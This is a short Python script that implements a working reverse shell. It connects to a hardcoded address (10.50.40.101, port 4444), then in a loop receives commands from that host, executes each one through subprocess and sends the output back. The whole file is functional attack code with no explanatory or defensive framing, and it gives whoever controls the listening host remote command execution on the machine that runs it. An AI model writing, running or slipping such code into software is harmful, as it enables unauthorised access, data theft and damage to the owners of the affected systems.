import sys
import socket
import subprocess


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '10.50.40.101'
port = 4444

sock.connect((host, port))

while True:
    command = sock.recv(1024).decode()
    output = subprocess.getoutput(command)
    sock.send(output.encode())